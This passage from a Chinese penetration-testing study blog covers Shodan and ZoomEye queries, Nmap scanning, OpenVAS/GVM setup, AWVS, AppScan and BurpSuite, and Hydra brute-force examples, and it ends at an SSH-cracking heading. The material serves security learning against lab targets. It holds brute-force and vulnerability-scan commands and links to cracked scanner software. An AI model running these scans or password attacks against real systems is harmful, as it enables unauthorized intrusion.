<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">os:&quot;Windows Server 2008 R2&quot;</span><br><span class="line">os:&quot;Windows 7 or 8&quot;</span><br><span class="line">os:&quot;Linux 2.6.x&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>net</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">net:110.180.13.0/24</span><br><span class="line"># 某个网段的机器</span><br><span class="line">200 ok net:110.180.13.0/24</span><br><span class="line"># 加上返回码</span><br><span class="line">200 ok country:JP net:110.180.13.0/24</span><br></pre></td></tr></table></figure></li>
<li><p>port</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">port:3389</span><br><span class="line"># windows一般会开3389端口 mstsc打开远程桌面连接，输入计算机ip地址，之后要知道用户名和密码就可以连接</span><br><span class="line"></span><br><span class="line">port:445</span><br><span class="line"># samba</span><br><span class="line"></span><br><span class="line">port:22</span><br><span class="line">port:80</span><br><span class="line"></span><br><span class="line">port:443</span><br><span class="line"># http</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="综合案例">综合案例</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 搜索日本区开启80端口的设备：</span><br><span class="line">country:jp port:80</span><br><span class="line">country:jp port:80 product:&quot;Apache httpd&quot;</span><br><span class="line">country:jp port:80 product:&quot;Apache httpd&quot; city:&quot;Tokyo&quot;</span><br><span class="line">country:jp port:80 product:&quot;Apache httpd&quot; city:&quot;Tokyo&quot; os:&quot;Linux 3.x&quot;</span><br><span class="line"></span><br><span class="line"># 搜索日本区使用Linux2.6.x系统的设备：</span><br><span class="line">country:jp os:&quot;Linux 2.6.x&quot;</span><br><span class="line">country:jp os:&quot;Linux 2.6.x&quot; port:&quot;80&quot;</span><br><span class="line">country:jp os:&quot;Linux 2.6.x&quot; port:&quot;80&quot; product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line"># 搜索日本区使用Windows Server系统的设备：</span><br><span class="line">country:jp os:&quot;Windows Server 2008 R2&quot;</span><br><span class="line">country:jp os:&quot;Windows Server 2003&quot; port:&quot;445&quot;</span><br><span class="line">country:jp os:&quot;Windows server 2003&quot; port:&quot;80&quot;</span><br><span class="line"></span><br><span class="line"># 搜索日本区使用Microsoft IIS的设备：</span><br><span class="line">country:jp product:&quot;Microsoft IIS httpd&quot; version:&quot;7.5&quot;</span><br></pre></td></tr></table></figure>
<h3 id="zoomeye-hacking">Zoomeye Hacking</h3>
<blockquote>
<p>https://www.zoomeye.org/</p>
<p>Zoomeye (钟馗之眼) 面向网络空间的搜索引擎，国产的 Shodan，知道创宇出品</p>
<p>公网设备指纹检索和 Web 指纹检索</p>
<p>设备指纹包括应用名、版本、开放端口、操作系统、服务没、地理位置等</p>
<p>网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内存管理系统和数据库等</p>
</blockquote>
<ul>
<li>ip(IP 地址) / os / app(组件名) / service(服务名) / port / product / country / ver(组件版本) / cidr(CIDR IP 段:8.8.8.8/24) / hostname(主机名) / site(域名) / title(首页标题) / headers(HTTP 头) / keywords(首页关键词) / desc(首页描述信息)</li>
<li>用户手册</li>
</ul>
<h2 id="目标扫描篇">目标扫描篇</h2>
<p>和漏扫不同，信息扫描只是获得一些指纹信息</p>
<h3 id="nmap">Nmap</h3>
<blockquote>
<p>Nmap 是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行</p>
<p>https://nmap.org/</p>
<p>https://sectools.org/</p>
<p>命令行</p>
<p>！扫描行为本来也是攻击行为</p>
</blockquote>
<h4 id="扫描示例">扫描示例</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主机发现 C段扫描</span></span><br><span class="line">nmap -sn 192.168.106.0/24</span><br><span class="line">nmap -sn www.baidu.com/24</span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">nmap -sS -p1-1000 192.168.106.134</span><br><span class="line"><span class="comment"># 系统扫描</span></span><br><span class="line">nmap -O 192.168.106.134</span><br><span class="line"><span class="comment"># 版本扫描 - 服务版本信息</span></span><br><span class="line">nmap -sV 192.168.106.134</span><br><span class="line">nmap -sV 192.168.106.134 -p1-1024</span><br><span class="line"><span class="comment"># 综合扫描</span></span><br><span class="line">nmap -A 192.168.106.134</span><br><span class="line"><span class="comment"># 脚本扫描</span></span><br><span class="line">root@kali:/usr/share/nmap/scripts</span><br><span class="line">nmap --script=default 192.168.106.134</span><br><span class="line">nmap --script=auth 192.168.106.214</span><br><span class="line">nmap --script=brute 192.168.106.134</span><br><span class="line">nmap --script=vuln 192.168.106.134</span><br><span class="line">nmap --script=broadcast 192.168.106.134</span><br><span class="line">nmap --script=smb-brute.nse 192.168.106.134</span><br><span class="line">nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.106.134</span><br><span class="line">nmap --script=smb-vuln-conficker.nse --script-args=unsafe=1 192.168.106.134</span><br><span class="line">nmap -p3306 --script=mysql-empty-password.nse 192.168.106.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是什么服务的端口</span></span><br><span class="line">grep 111 /etc/services</span><br><span class="line"></span><br><span class="line">nmap --<span class="built_in">help</span> | grep <span class="string">&#x27;\-Pn&#x27;</span></span><br><span class="line"></span><br><span class="line">tcpdump -i eth0 -nn host 192.168.106.134 and port 22</span><br><span class="line"><span class="comment"># -n不将端口解析成为协议名 不将IP解析成为主机名</span></span><br><span class="line">nc 192.168.106.134 -t 22</span><br><span class="line"><span class="comment"># SYN ACK FIN RST(reset)</span></span><br><span class="line">当访问一个未开启的tcp端口的时候，服务器会回一个带有reset的标记</span><br><span class="line">当访问一个未开启的udp端口的时候，服务器会使用icmp协议回一个端口不可达</span><br><span class="line">tcpdump -i eth0 -nn host 192.168.106.134 and port 7777 or icmp</span><br><span class="line">nc 192.168.106.134 -u 7777</span><br><span class="line">nc -l -u 7777</span><br></pre></td></tr></table></figure>
<h3 id="zenmap">zenmap</h3>
<p>图形化、nmap 的前端</p>
<ul>
<li><p>intense scan</p>
<p><img src="zenmap-intensescan.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.50.129</span><br><span class="line">-T 设置速度等级，1到5级，数字越大，速度越快</span><br><span class="line">-A 综合扫描</span><br><span class="line">-v 输出扫描过程</span><br></pre></td></tr></table></figure></li>
<li><p>intense scan plus UDP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sU -T4 -A -v 192.168.106.134</span><br><span class="line">-sS TCP全连接扫描</span><br><span class="line">-sU UDP扫描</span><br></pre></td></tr></table></figure></li>
<li><p>intense scan, all TCP ports</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 1-65535 -T4 -A -v 192.168.106.134</span><br><span class="line">-p 指定端口范围，默认扫描1000歌端口</span><br></pre></td></tr></table></figure></li>
<li><p>intense scan no ping</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap =T4 -A -v -Pn 192.168.106.134/24</span><br><span class="line">-Pn 不做ping扫描，例如针对防火墙等安全产品</span><br></pre></td></tr></table></figure></li>
<li><p>ping scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.106.0/24</span><br><span class="line">nmap -sn -T4 -v 192.168.106.0/24</span><br><span class="line">-sn 只做ping扫描，不做端口扫描</span><br></pre></td></tr></table></figure></li>
<li><p>quick scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -F 192.168.106.134</span><br><span class="line">-F fast模式，只扫描常见服务端口，比默认端口(1000个)还少</span><br></pre></td></tr></table></figure></li>
<li><p>quick scan plus</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -T4 -O -F --version-light 192.168.106.134</span><br><span class="line">-sV 扫描系统和服务版本</span><br><span class="line">-O  扫描操作系统版本</span><br></pre></td></tr></table></figure></li>
<li><p>quick traceroute</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn --traceroute www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>regular scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>slow comprehensive scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script <span class="string">&quot;default or (discovery and safe)&quot;</span> 192.168.50.129</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="openvas">OpenVAS</h3>
<blockquote>
<p>OpenVAS(Open Vulnerability Assessment System)，即开放式漏洞评估系统，是一个用于评估目标漏洞的接触框架，开源且功能十分强大</p>
<p>它与著名的 Nessus“本是同根生”，在 Nessus 商业化之后仍然坚持开源，号称“当前最好用的开源漏洞扫描工具”</p>
<p>最新版的 Kali Linux 不再自带 OpenVAS 了，需要自己部署 OpenVAS 漏洞检测系统</p>
<p>其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。但是他的最常用用途是检测目标网络或主机的安全性。他的评估能力来源于数万个漏洞测试程序，这些程序都是以插件的形式存在。</p>
<p>openvas 是基于 C/S(客户端/服务器)，B/S(浏览器/服务器)架构进行工作，用户通过浏览器或者专用客户端程序来下达扫描任务，服务器端负责授权，执行扫描操作并提供扫描结果</p>
<p>https://openvas.org/</p>
<p>https://www.greenbone.net/</p>
</blockquote>
<table>
<thead>
<tr class="header">
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>gvmd</td>
<td>GVM10 自带的守护进程</td>
</tr>
<tr class="even">
<td>openvasmd</td>
<td>GVM9 及之前的守护进程的叫法</td>
</tr>
<tr class="odd">
<td>openvassd</td>
<td>GVM 的扫描器进程，作用就是进行漏洞扫描，并将结果反馈给管理模块</td>
</tr>
</tbody>
</table>
<h4 id="部署">部署</h4>
<p>部署太难了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级kali</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装OpenVAS</span></span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改admin账户密码</span></span><br><span class="line">openvasmd --user=admin --new-password=zzr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改默认监听IP</span></span><br><span class="line">vim /lib/systemd/system/greenbone-security-assistant.service</span><br><span class="line"><span class="comment"># 默认情况下只能从本机访问它的端口</span></span><br><span class="line"><span class="comment"># 可以修改ip，允许所有主机访问，从远程访问</span></span><br><span class="line"><span class="comment"># 不建议修改，不太好访问，直接通过本地kali浏览器访问也是很方便的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动OpenVAS</span></span><br><span class="line">openvas-start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装</span></span><br><span class="line">ss -tnlp <span class="comment"># 有三个端口监听</span></span><br><span class="line">openvas-check-setup <span class="comment"># 启动后再进行检测</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://technowikis.com/12315/how-to-install-openvas-on-kali-linux-2020">教程</a></p>
<p><img src="openvassetup-fail.png" /></p>
<p><a target="_blank" rel="noopener" href="https://dannyda.com/2020/08/07/how-to-fix-openvas-command-not-found-in-kali-linux-2020-2a/?__cf_chl_jschl_tk__=25139ba6d591f4c846aeee7acf53a5a54fd929cb-1598151469-0-AVLyhg31Xds7rGgzPy_P1bs4A_rVKfEsoy86KpTgdeuU54ZcELtu_89Wr3bLR56_S97NdzFH5qkaKMXqH27Tn0UFr-sIBPYsH4thg7t4NHzxnYuzSOq77KsiLoK5pP1FUQrf48M1WkrhBcob_YgqrRn19j7kivDKa9nkpltttdw84SFGXvXMTHsn5qml825gKEU-LJ0GFQj2Ns4Aj4fv__gy-GnAqxEk_4fIuLRKNOegZwRKzP4ucAg_TBpb3Coq4tFkD73MEiDV9onZGBh9Wh3tlvY-ilEV8_sUtNrHPdvvkBSJB1Fd0-eil9tHlI8VZ2S6gjunkvpMQCgrPFCrsyrYcPfH3iSmPpyL8QvFLRqM">openvas-setup command not found 解决方法</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OpenVAS is changing the name, the new <span class="built_in">command</span> gvm will replace all openvas commands.</span><br><span class="line">Since Kali Rolling updated repository, we now should use gvm instead of openvas commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># gvm Greenbone Vulnerability Manager</span></span><br><span class="line">sudo apt install gvm -y</span><br><span class="line">sudo gvm-setup</span><br><span class="line">sudo gvm-feed-update</span><br><span class="line">sudo gvm-start</span><br><span class="line"></span><br><span class="line"><span class="comment"># gvm-setup报错</span></span><br><span class="line"><span class="comment"># ERROR: The default postgresql version is not 12 required by libgvmd</span></span><br><span class="line"><span class="comment"># solved：https://askubuntu.com/questions/1223270/psql-command-error-postgresql-version-12-is-not-installed</span></span><br></pre></td></tr></table></figure>
<p>https://dannyda.com/2020/08/07/how-to-fix-openvas-command-not-found-in-kali-linux-2020-2a/#comment-201</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Tested <span class="keyword">for</span> you.</span><br><span class="line">If you create a new VM, <span class="keyword">then</span> install Kali Linux by using the 2020.3 ISO file, <span class="keyword">then</span> install GVM by using these commands</span><br><span class="line">sudo apt install gvm</span><br><span class="line">sudo gvm-setup</span><br><span class="line">Then record the last part from the <span class="built_in">command</span> output <span class="built_in">which</span> will have your password <span class="keyword">for</span> user: admin</span><br><span class="line">[+] Done</span><br><span class="line">[*] Please note the password <span class="keyword">for</span> the admin user</span><br><span class="line">[*] User created with password ‘xxxxxxxxxxxxxxxxxxxxxxxxxxx’.</span><br><span class="line">sudo gvm-start</span><br><span class="line"></span><br><span class="line">Then open a browser within Kali Linux, enter https://127.0.0.1:9392</span><br><span class="line">You should be able to use it.</span><br></pre></td></tr></table></figure>
<p><img src="gvm-setup.png" /></p>
<p><img src="gvm-setup-success.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 都需要sudo权限</span></span><br><span class="line"><span class="comment"># gvm修改密码</span></span><br><span class="line">sudo gvmd --user=admin --new-password=admin</span><br><span class="line"><span class="comment"># 修改不成功</span></span><br></pre></td></tr></table></figure>
<p>https://dannyda.com/2020/08/26/how-to-reset-admin-password-for-openvas-and-gvm-11/https://dannyda.com/2020/08/26/how-to-reset-admin-password-for-openvas-and-gvm-11/</p>
<p>https://www.cnblogs.com/godyrg/p/13523166.html</p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/linhong/2134910?source=drt">当有其中一个服务启动 failed 的解决方法</a></p>
<p>虽然环境搭好了，但是我扫描一直都得不到结果</p>
<p><img src="openvas-error.png" /></p>
<p>可能还是什么服务没有正常运行 - 【版本不兼容问题吧-没深究了】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /var/log/gvm/gvmd.log</span></span><br><span class="line">openvas manage_update_nvt_cache_osp:failed to connect to /run/ospd/ospd.sock</span><br></pre></td></tr></table></figure>
<p>我放弃了，决定用 docker 的方式搭建 https://www.freebuf.com/articles/container/236909.html - 【未测试】</p>
<p>https://www.cnblogs.com/mysticbinary/p/12779149.html - 【成功】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker openvas logs</span><br></pre></td></tr></table></figure>
<h4 id="登录">登录</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gvm-start</span><br><span class="line"></span><br><span class="line">https://192.168.106.158:9392</span><br><span class="line"><span class="comment"># 为KaliIP地址</span></span><br><span class="line"><span class="comment"># 注是https</span></span><br></pre></td></tr></table></figure>
<p><img src="gvm-dashboard.png" alt="gvm-dashboard" style="zoom:67%;" /></p>
<h4 id="新建扫描-task">新建扫描 task</h4>
<p>扫描需要的时间很长：1.我们不能在业务繁忙的时候进行扫描，也不能对未授权的站点进行扫描</p>
<ul>
<li>Scans -&gt; Tasks</li>
<li>选择紫色的小魔法棒 -&gt; Task wizard -&gt; 对目标主机进行扫描</li>
<li>导出扫描报告</li>
</ul>
<h4 id="高级扫描-task">高级扫描 task</h4>
<ul>
<li><p>选择紫色的小魔法棒 -&gt; Advanced Task wizard -&gt; 对目标主机进行扫描</p>
<p><img src="openvas-ascan.png" /></p>
<p><img src="openvas-running.png" alt="image-20200829222358213" style="zoom:67%;" /></p></li>
<li><p>导出扫描报告</p>
<p>出现扫描进度条，才算可以，只不过 openvas 的耗时巨久</p>
<p><img src="openvas-report.png" /></p></li>
</ul>
<h1 id="web-漏洞扫描">Web 漏洞扫描</h1>
<h2 id="awvs">AWVS</h2>
<blockquote>
<p>Acunetix Web Vulnerability Scanner(AWVS)是一款知名的 Web 网络漏扫工具。它通过网络爬虫测试网站安全，检测流行安全漏洞。它包含有收费和免费两种版本</p>
<p>https://www.acunetix.com/</p>
<p>https://www.acunetix.com/vulnerability-scanner/download/</p>
<p>https://www.acunetix.com/download/fullver13/</p>
<blockquote>
<p>功能以及特点</p>
<ol type="1">
<li>自动的客户端脚本分析器，允许对 Ajax 和 Web2.0 应用程序进行安全性测试</li>
<li>业内最先进且深入的 SQL 注入和跨站脚本测试</li>
<li>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer</li>
<li>可视化宏记录器轻松测试 web 表格和受密码保护的区域</li>
<li>支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor(双因素)验证机制</li>
<li>丰富的报告功能，包括 VISA PCI 依从性报告</li>
<li>高速的多线程扫描器轻松检索成千上万个页面</li>
<li>智能爬行程序检测 web 服务器类型和应用程序语言</li>
<li>Acunetix 检索并分析网站，包括 flash 内容、SOAP 和 AJAX</li>
<li>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查</li>
<li>可导出网站漏洞文件</li>
</ol>
</blockquote>
</blockquote>
<h3 id="项目环境">项目环境</h3>
<ul>
<li>目标靶机：OWASP_Broken_Web_Apps_VM_1.2</li>
<li>测试渗透机：win7(即软件安装在 win7 上)</li>
<li>大多数软件都是基于 java 环境，所以要在 win7 攻击机上安装 Windows 版的 java 包</li>
</ul>
<h3 id="awvs-安装">AWVS 安装</h3>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hunter-01001100/p/12433813.html">漏洞扫描工具 acunetix 破解安装步骤</a> - 网页版</p>
<p><img src="acunetix-web.png" /></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1480771">AWVS 中文教程</a> - Consultant Edition</p>
<p><img src="acunetix-consultantedition.png" /></p>
<h3 id="awvs-使用">AWVS 使用</h3>
<ul>
<li><p>网站扫描 - Web Scanner ⭐</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 官方提供的扫描页面</span><br><span class="line">http://testhtml5.vulnweb.com/</span><br><span class="line">http://testphp.vulnweb.com/</span><br><span class="line">http://testasp.vulnweb.com/</span><br><span class="line">http://testaspnet.vulnweb.com/</span><br><span class="line"></span><br><span class="line"># profile是扫描配置，关注哪个漏洞，选择测试类型</span><br><span class="line"></span><br><span class="line"># 提供信息</span><br><span class="line">- Target Information</span><br><span class="line">- Web Alerts 漏洞告警</span><br><span class="line">- Site Structure 网站架构</span><br><span class="line">- Activity 扫描日志</span><br><span class="line"></span><br><span class="line"># 弹出的标单随意填写</span><br></pre></td></tr></table></figure></li>
<li><p>站点爬取 - Site Crawler</p></li>
<li><p>目标查找 - Target Finder</p></li>
<li><p>子域名扫描 - Subdomain Scanner</p></li>
<li><p>SQL 盲注 - Blind SQL Injector</p></li>
<li><p>HTTP 编辑器 - HTTP Editor</p></li>
<li><p>HTTP 嗅探 - HTTP Sniffer</p></li>
<li><p>HTTP 模糊测试 - HTTP Fuzzer</p></li>
<li><p>认证测试 - Authentication Tester</p></li>
<li><p>结果比较 - Compare Results</p>
<p>用得较多、Consultant Edition</p></li>
<li><p>网站服务扫描 - Web Services Scanner</p></li>
<li><p>任务计划</p></li>
<li><p>扫描报告 - Report</p>
<p>加上甲方 logo 等信息</p></li>
<li><p>AWVS 配置</p></li>
</ul>
<h2 id="appscan">AppScan</h2>
<blockquote>
<p>IBM Security AppScan 是一个适合安全专家的 Web 应用程序和 Web 服务渗透测试解决方案</p>
<p>国外商业漏扫产品中，少有的能支持中文的漏扫，运行于 windows 平台</p>
<p>界面清晰、配置简单丰富的中文和产品文档，详细的漏洞说明和修复建议</p>
<p>支持丰富的扫描报告，包括安全性、行业标准、合规一次性报告</p>
<blockquote>
<p>功能及特点</p>
<ol type="1">
<li>对现代 Web 应用程序和服务执行自动化的动态应用程序安全测试(DAST)和交互式应用程序安全测试(IAST)</li>
<li>支持 web 2.0、JavaScript 和 AJAX 框架的全面的 JavaScript 执行引擎</li>
<li>涵盖 XML 和 JSON 基础架构的 SOAP 和 REST Web 服务测试支持 WS-Security 标准、XML 加密和 XML 签名</li>
<li>详细的漏洞公告和修复建议</li>
<li>40 多种合规性报告，包括支付卡行业数据安全标准(PCI DSS)、支付应用程序数据安全标准(PA-DSS)、ISO 27001 和 ISO 27002，以及 Basel Ⅱ</li>
<li>IBM Security AppScan eXtensions Framework 提供的自定义功能和可扩展性</li>
</ol>
</blockquote>
<p>测试网站：demo.testfire.net 用户名：jsmith 密码：Demo1234</p>
<p>该软件体量比较大，需要足够的内存</p>
</blockquote>
<h3 id="安装">安装</h3>
<p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/appscan-use.html">AppScan 下载安装使用教程</a> - 我扫描得出的都是安全，所以我换一个高版本</p>
<p><a target="_blank" rel="noopener" href="https://www.shungg.cn/post/247">下载地址-教程二</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mad-coding.cn/2019/08/21/AppScan-9-0-3-13-破解版本安装教程/#0x02-开始安装">内容同上-教程二</a></p>
<h3 id="使用">使用</h3>
<p>文件 -&gt; 新建 -&gt; 常规扫描 -&gt; 填入对应的 URL</p>
<p>登录方法 -&gt; 自动(填入用户名和密码等信息) -&gt; 自动检测会话中配置</p>
<p>扫描 pwaspbwa 的结果</p>
<p><img src="appscan.png" /></p>
<p>需要在一次会话中完成扫描，否则下一次打开就会报错会话检测问题</p>
<h2 id="burpsuite">BurpSuite</h2>
<blockquote>
<p>安全渗透界使用最广泛的漏扫工具之一，能实现从漏洞发现到利用的完整过程</p>
<p>功能强大、配置较为复杂、可定制型强、支持丰富的第三方拓展插件、基于 Java 编写、跨平台支持、分为 Free 和 Professional 版本</p>
<p>https://portswigger.net/burp</p>
<p>核心功能：目标(基础)、代理、爬虫、扫描、入侵</p>
<p>辅助功能：重放、序列器、解码器、对比</p>
<ul>
<li>Target：目标模块用于设置扫描域(target scope)、生成站点地图(sitemap)、生成安全分析</li>
<li>Proxy：代理模块用于拦截浏览器的 http 会话内容</li>
<li>Spider：爬虫模块用于自动爬取网站的每个页面内容，并生成完整的网站地图</li>
<li>Scanner：扫描模块用于自动化检测漏洞，分为主动和被动扫描</li>
<li>Intruder：入侵(渗透)模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击；入侵模块的原理是根据访问链接中存在的参数，调用本地词典、攻击载荷，对参数进行渗透测试</li>
<li>Repeater：重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</li>
<li>Sequencer：序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</li>
<li>Decoder：解码器模块用于实现对 URL、HTML、Base64、ASCII、二/八/十六进制、哈希等编码转换</li>
<li>Comparer：对比模块用于对两次不同的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</li>
<li>Extender：拓展模块是 burpsuite 非常强悍的一个功能，也是它跟其他 Web 安全评估系统最大的差别；通过拓展模块，可以加载自己开发的或者第三方模块，打造自己的 burpsuite 功能；通过 burpsuite 提供的 API 接口，目前可以支持 Java、Python、Ruby 三种语言的模块编写</li>
<li>Options：分为 Project/User Options，主要对软件进行全局设置</li>
<li>Alerts：显示软件的使用日志信息</li>
</ul>
</blockquote>
<h3 id="安装-1">安装</h3>
<ul>
<li>kali linux：集成 burpsuite free 版本，不支持 scanner 功能</li>
<li>burpsuite pro 1.7.30 版本，支持全部功能
<ul>
<li>启动方法：java -jar -Xmx1024M /burpsuite_path/BurpHelper.jar</li>
</ul></li>
<li>浏览器的代理软件
<ul>
<li>SwitchyOmega：添加 proxy，填写 proxy servers</li>
</ul></li>
</ul>
<h3 id="代理功能---proxy">代理功能 - Proxy</h3>
<blockquote>
<p>开启监听端口</p>
<p>浏览器设置代理</p>
<p>代理功能详解</p>
<p>拦截账号信息</p>
</blockquote>
<p>要扫描 OWASP 靶机，必须先要设置代理，<strong>保证数据能够经过 Burpsuite</strong></p>
<p>http history</p>
<h3 id="目标功能---target">目标功能 - Target</h3>
<ul>
<li><p>站点地图 Site map</p></li>
<li><p>设置目标域 Target Scope</p>
<ul>
<li>选择想要的站点</li>
<li>全局/局部</li>
</ul></li>
<li><p>filter(选择想要显示部分)</p></li>
</ul>
<h3 id="爬虫功能---spider">爬虫功能 - Spider</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 准备工作</span><br><span class="line">1. 设置代理获取域名</span><br><span class="line">2. 访问目标网站</span><br><span class="line">3. 设置目标域</span><br><span class="line">4. 拦截功能关闭</span><br><span class="line"></span><br><span class="line"># 爬取设置</span><br><span class="line">Spider -&gt; Options -&gt; Crawler Settings</span><br><span class="line">1. 检查robots.txt文件</span><br><span class="line">2. 检查404页面</span><br><span class="line">3. 请求所有页面</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>有些页面是灰色的，即该页面我们没有访问。我们主动访问一些页面，但是其他未经访问的页面也被爬取下来，说明 Burpsuite 在被动爬取</li>
</ul>
<h3 id="扫描功能---scanner">扫描功能 - Scanner</h3>
<p>BurpSuite 社区版没有扫描功能</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 准备工作</span><br><span class="line">1. 设置代理获取域名</span><br><span class="line">2. 访问目标网站</span><br><span class="line">3. 设置目标域</span><br><span class="line">4. 拦截功能关闭</span><br><span class="line"></span><br><span class="line"># 扫描选项之扫描方式</span><br><span class="line">主动扫描精准度高时间长影响大消耗资源多</span><br><span class="line">主动扫描默认关闭，当手工浏览网页时主动发送大量探测请求来确定是否会对目标系统有性能压力，适合离线环境</span><br><span class="line"></span><br><span class="line">被动扫描精准度低时间段影响小消耗资源少</span><br><span class="line">被动扫描默认开启，当手工浏览网页时，基于原有网页数据进行探测，不再发送请求，压力最小，也能针对性测试，适合生产环境</span><br><span class="line">即在目标域下面手工浏览网页时，Burpsuite启动passive scanner进行扫描，通过手工浏览网页+之前爬虫获得的站点地图(包含详细页面)，将这些已经存在的网页，发送到被动扫描模块</span><br></pre></td></tr></table></figure>
<p>issue activity -&gt; 导出报告</p>
<p><img src="burpsuite-scan.png" /></p>
<h1 id="ssh-密码暴力破解以及防御实战">SSH 密码暴力破解以及防御实战</h1>
<p>在线破解：服务开启，通过不断尝试、探测破解</p>
<p>离线破解：获得本地密码文件如 shadow 文件，通过 MD5 的网站或者工具去破解</p>
<h2 id="hydra-海德拉">hydra [海德拉]</h2>
<blockquote>
<p>世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于<strong>破解字典</strong>是否足够强大，在网络安全渗透过程中是一款必备的测试工具</p>
<ol type="1">
<li>命令行版本</li>
<li>GUI 版本 xhydra</li>
</ol>
</blockquote>
<h3 id="指定用户破解-用户列表破解">指定用户破解 &amp; 用户列表破解</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Examples:</span><br><span class="line"><span class="comment"># -l 指的是login，即使用登录名user进行登录</span></span><br><span class="line"><span class="comment"># -P 使用密码字典passlist.txt进行破解</span></span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -l user -P passlist.txt 192.168.0.1 ftp</span><br><span class="line"><span class="comment"># -L 指的是login，即使用账号字典userlist.txt进行破解</span></span><br><span class="line"><span class="comment"># -p 使用密码进行登录</span></span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line"><span class="comment"># -C 指定所用格式为&quot;user:password&quot;字典文件</span></span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line"><span class="comment"># -M 指定破解的目标文件，如果不是默认端口，后面跟上&quot;: port&quot;</span></span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line">  </span><br><span class="line">:<span class="built_in">set</span> list</span><br></pre></td></tr></table></figure>
<p><img src="hydra-owaspbwa.png" /></p>
<h2 id="medusa-美杜莎">Medusa [美杜莎]</h2>
<blockquote>
<p>Medusa 是一个速度快、支持大规模并行、模块化、爆破登录、可以同时对多个主机、用户或密码执行强力测试</p>
<p>同 hydra 一样属于在线密码破解工具，但 medusa 的稳定性相较于 hydra 要好很多，但其支持模块要比 hydra 少一些</p>
</blockquote>
<p>kali 没有 medusa apt-get install</p>
<h3 id="语法参数">语法参数</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h</span><br></pre></td></tr></table></figure>
<h3 id="破解-ssh-密码">破解 SSH 密码</h3>
